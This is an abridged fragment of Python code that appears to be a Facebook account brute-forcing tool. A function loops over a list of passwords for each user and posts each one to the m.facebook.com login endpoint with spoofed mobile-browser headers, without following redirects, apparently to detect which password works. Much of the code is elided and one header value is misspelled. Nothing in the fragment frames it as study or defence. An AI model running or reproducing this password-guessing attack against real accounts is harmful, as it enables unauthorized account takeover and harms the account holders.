...
def method():
    ...
    def start(user):
     try:
        ...
        for pword in totalpass:     
            heads = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36]"
            ...
            header = {"Content-Type": "application/x-www-form-accencoded",'authority': 'm.facebook.com',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-BD,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'cache-control': 'max-age=0',
    'dpr': '1.7000000476837158',
    'referer': 'https://m.facebook.com/login/device-based/regular/logout/?h=AffgGIgpFCB1pSJ3KPQ&t=1723227293',
    ...
    'viewport-width': '980',
            ...
            response = r.post('https://m.facebook.com/login.php?next=https%3A%2F%2Fm.facebook.com%2Fbookmarks%2F&refsrc=deprecated',data=data,headers=header,allow_redirects=False)
      #      print(response.text) 
